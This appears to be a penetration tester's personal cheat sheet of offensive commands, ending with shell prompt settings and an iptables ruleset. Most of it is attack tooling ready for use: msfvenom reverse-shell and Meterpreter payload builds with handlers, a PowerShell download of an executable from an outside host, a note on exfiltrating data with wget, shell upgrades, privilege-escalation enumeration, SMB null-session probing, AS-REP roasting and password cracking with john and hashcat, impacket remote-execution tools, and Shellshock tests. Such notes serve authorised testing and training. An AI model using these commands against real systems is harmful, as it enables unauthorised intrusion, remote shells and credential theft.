

nmap thorough scan:
nmap -v -sV -Pn -A -p- --reason
nmap -v -sV -Pn -A -p- --reason  -oA FILENAME <IP>

nmap -v -sV -Pn -A -p- --reason -oA 192.168.8.0-24 192.168.8.0/24


nmap default scripts: 
nmap -sC 

#nmap  run specific scripts:
nmap -Pn --script "http*" --script-args <n1>=<v1>,<n2>={<n3>=<v3>},<n4>={<v4>,<v5>}
or use --script-help

scan for open ports using only bash. This is slow because it does a syn retransmission and backoff.
export TARGET=<IP ADDRESS>
for i in {1..65535} ; do (timeout .5 bash -c "echo < /dev/tcp/$TARGET/$i") &>/dev/null && printf "\n[+] Open Port at\n: \t%d\n" "$i" || printf "."; done

or for more targeted:
for i in 21 22 23 80 135 443 445 3389 ; do (timeout 1 bash -c "echo < /dev/tcp/$TARGET/$i") &>/dev/null && printf "\n[+] Open Port at\n: \t%d\n" "$i" || printf "."; done

# echo 21 22 23 80 135 443 445 3389 ; do (timeout 1 bash -c "echo < /dev/tcp/$TARGET/$i") &>/dev/null && printf "\n[+] Open Port at\n: \t%d\n" "$i" || printf "."; done


# Actively elicit ARP responses across network for host discovery:
for i in {1..255} ; do ping -nc 1 -W 1 10.1.1.$i ; ip n >>disc.txt; done

or

for i in {1..255} ; do nc -nvzu -w 1 -r   10.1.1.$i 13541; ip n >>disc.txt; done




Upgrade a shell:
	python -c 'import pty; pty.spawn("/bin/bash")'
	python3 -c 'import pty; pty.spawn("/bin/bash")'
	echo os.system('/bin/bash')
	/bin/sh -i
	perl â€”e 'exec "/bin/sh";'
	perl: exec "/bin/sh";
	ruby: exec "/bin/sh"
	lua: os.execute('/bin/sh')
	(From within IRB)
		exec "/bin/sh"
	(From within vi)
		:!bash
	(From within vi)
		:set shell=/bin/bash:shell
	(From within nmap)
		!sh


You can then ctrl-z and do:
	stty -a | head -n1
	stty raw -echo 
	fg
and then from within the remote shell:
	export HOME=/root
	export SHELL=/bin/bash
	export TERM=xterm-256color
	stty rows X columns Y



Getting data/scripts to target:
$ cat <<EOF > target_file.py
  Then copy the file content and paste it in the terminal. And after you pasted it into the Terminal you type EOF.
 
 You can use base64 encoding to transfer binaries like this. For example when you have a .tar.gz file you want to get to the server. On your machine you do:

cat archive.tar.gz | base64 | xclip

Copy the long base64 encoded file. And on the target do the following:

cat <<EOF | base64 -d > archive.tar.gz
///// paste here the base64 encoded file
EOF



 bash -c 'true <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF' || echo "CVE-2014-7186 vulnerable, redir_stack"
# Shellshock  CVE-2014-7187
 
 (for x in {1..200} ; do echo "for x$x in ; do :"; done; for x in {1..200} ; do echo done ; done) | bash || echo "CVE-2014-7187 vulnerable, word_lineno"
 
 
 
 Meterpreter handlers:
 handler -H LHOST -P port -p windows/x64/meterpreter_reverse_https
 
 handler -P <PORT> -p multi/meterpreter/reverse_http
 handler -P <PORT> -p multi/meterpreter/reverse_https

 
setuid doesn't work on scripts or bash

# Reattach to tmux session:
tmux -S <tmux session file>

exfil data with wget --post-file to locally hosted http server


----------------------
msfvenom
# Staged Meterpreter
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f elf > shell.elf
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f exe > shell.exe
msfvenom -p php/meterpreter_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.php

# Unstaged Reverse TCP shell
msfvenom -p linux/x86/shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f elf > shell.elf
msfvenom -p windows/shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f exe > shell.exe
msfvenom -p php/shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.php


cat shell.php | pbcopy && echo '<?php ' | tr -d '\n' > shell.php && pbpaste >> shell.php




***********
Linux Privesc Enumeration
*********
hostname
id
cat /etc/passwd
cat /etc/issue
cat /etc/*-release
ps aux
ps -eaf
uname -a

ip a
ifconfig -a
/sbin/route -n
netstat -antup
ss -antup
iptables -nvL    # this is priveledged, and also you need to manually check the other tables
cat /etc/iptables/*
# find other poorly protected iptables-save output in /etc
find /etc/ -name "*iptables*" 2>/dev/null -exec ls -l {} \;

ls -lah /etc/cron*
cat /etc/crontab
crontab -l

dpkg -l

find / -writable -type d 2>/dev/null

cat /etc/fstab
mount 
/bin/lsblk

lsmod
/sbin/modinfo <MODULENAME>


find / -perm -u=s -type f -exec ls -l {} \; 2>/dev/null
find / -perm -g=s -type f  -exec ls -l {} \;  2>/dev/null


screen -ls
tmux -l



############## 
# Windows tips 
##############


# don't forget  enum4linux.pl

powershell 2.0 "wget"
powershell -command  "(new-object System.Net.WebClient).DownloadFile('http://10.10.12.45:8080/1.exe','C:\Users\security\Downloads\1.exe')


# get password policy with null authentication with crackmapexec
crackmapexec smb <ip> --pass-pol -u '' -p ''  

# Unautheneticated RPC
rpcclient -U "" -N $IP

RPC enumeration:
#Enumerate domain users:
rpcclient $> enumdomusers

#enumrerate domain groups:
enumdomgroups

smb password attempt:
rpcclient -U "user%pass" -c "getusername;quit" ip

smbclient -L \\Domain_Name -I <DC_IP> -Nenum
Check if any of the shared paths is writable. If any shared path is writable with known account credential, we can use Psexec for Remote command execution.

smbclient //<share path> -I <DC_IP> -N


smbclient -U "username%password" \\\\host\\SHARE

john the ripper example (wordlist mutation)
john --format=raw-sha512 --wordlist=/usr/share/wordlists/rockyou.txt passwordfile  --rules




# netcat banner grab
nc TARGET-IP 80
GET / HTTP/1.1
Host: TARGET-IP
User-Agent: Mozilla/5.0
Referrer: meh-domain


# dirb
dirb http://url/ -X .html /usr/share/dirb/wordlists/

gobuster -e -u http://10.10.10.6 -w /usr/share/wordlists/dirb/common.txt


# Kerberos / AD
# Identify a user (OSINT, user bruteforce, kerbrute a possible user list)
# See https://gist.github.com/TarlogicSecurity/2f221924fef8c14a1d8e29f3cb5c5c4a

# Unautheneticated ticket:
python3 GetNPUsers.py DOMAIN/User -no-pass

result.hash
$krb5asrep$23$user@DOMAIN:HAAAAAAAAAAAAAAAAAAASH

john --wordlist=/usr/share/wordlists/rockyou.txt result.hash


john --wordlist=/usr/share/wordlists/rockyou.txt 

john --show <filename>

Generates year permutations of a wordlist
for i in $(cat pwdlist.txt); do echo $i; echo ${i}2019; echo ${i}2020;echo ${i}\!; done > pwlist.txt

hashcat --force --stdout pwlist.txt -r /usr/share/hashcat/rules/best64.rule -r /usr/share/hashcat/rules/toggles1.rule | sort -u | awk 'length($0) > 7 ' > wordlist.txt

 
# impacket summary
Remote code Execution : atexec.py, dcomexec.py, psexec.py, smbexec.py and wmiexec.py
SMB/MSRPC : getArch.py, ifmap.py, lookupsid.py, samrdump.py, services.py, netview.py, smbclient.py, opdump.py, rpcdump.py and reg.py
Kerberos: GetST.py, GetPac.py, GetUserSPNs.py, GetNPUsers.py, ticketer.py and raiseChild.py
Windows Secret: mimikatz.py
Server Tools/MiTM Attacks: karmaSMB.py and smbserver.py
WMI: wmipersist.py
Known Vulnerabilities: sambaPipe.py and sambaPipe.py
MSSQL / TDS: mssqlclient.py
File Formats: ntfs-read.py and registry-read.py.
Others: mqtt_check.py, rdp_check.py, sniffer.py, ping.py, and ping6.py






Initial machine setup:


# Favorite prompt:
# export PROMPT_DIRPATH=3   #this might have been incorrect
export PROMPT_DIRTRIM=3
PS1="\[\033[0;33m\][\!]\`if [[ \$? = "0" ]]; then echo "\\[\\033[32m\\]"; else echo "\\[\\033[31m\\]"; fi\`[\u.\h: \w]\\$\[\033[0m\] "

# zsh equivilent
PROMPT='%F{yellow}%}[%h]%f%(?.%F{green}.%F{red}%})[%n.%m: %3~]%(!.#.$) %{$reset_color%}'

Some decent starter iptables

# Generated by xtables-save v1.8.2 on Wed Feb 20 13:30:39 2019
*filter
:INPUT ACCEPT [0:0]
:FORWARD DROP [0:0]
:OUTPUT ACCEPT [0:0]
:LOGDROP - [0:0]
-A INPUT -i lo -j ACCEPT
-A INPUT -m conntrack --ctstate RELATED,ESTABLISHED -j ACCEPT
-A INPUT -m conntrack --ctstate INVALID -j DROP
-A INPUT -j LOGDROP
-A FORWARD -j DROP
-A OUTPUT -o lo -j ACCEPT
-A OUTPUT -m conntrack --ctstate ESTABLISHED -j ACCEPT
-A OUTPUT -p tcp -m multiport --dports 53,67,68,1337 -j ACCEPT
-A OUTPUT -p tcp -m multiport --dports 22,53,80,443,1337 -j ACCEPT
-A OUTPUT -d 10.10.10.0/24 -o tun0 -j ACCEPT
-A OUTPUT -j LOGDROP
-A LOGDROP -m limit --limit 2/min -j LOG --log-prefix "iptables DROP"
-A LOGDROP -j DROP
COMMIT
# Completed on Wed Feb 20 13:30:39 2019





# If gnome-terminal wont' start, edit /etc/locale.conf and enable en_US.UTF8 and run locale-gen
